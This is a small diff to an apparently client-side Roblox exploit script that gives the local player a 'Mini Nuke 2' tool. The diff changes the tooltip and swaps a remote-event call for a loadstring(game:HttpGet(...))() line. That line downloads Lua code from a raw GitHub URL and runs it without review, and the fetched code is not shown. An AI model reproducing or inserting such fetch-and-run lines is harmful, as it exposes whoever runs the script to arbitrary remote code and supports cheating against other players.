@@ -233,7 +233,7 @@ tool.Parent = game.Players.LocalPlayer.Backpack
 local tool = Instance.new("Tool")
 tool.Name = "Mini Nuke 2"
 tool.RequiresHandle = false
-tool.ToolTip = "I gave My Soul to demon..."
+tool.ToolTip = "I'm not Atomic"
 
 local lastPressTime = 0
 tool.Activated:Connect(function()
@@ -258,7 +258,7 @@ tool.Activated:Connect(function()
   local currentTime = tick()
             if currentTime - lastPressTime >= 9999999 then
                 lastPressTime = currentTime 
-game:GetService("ReplicatedStorage").Remotes.sonido:FireServer()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IFeelPower/Battle/refs/heads/main/Revive"))()
 end
 end)
 
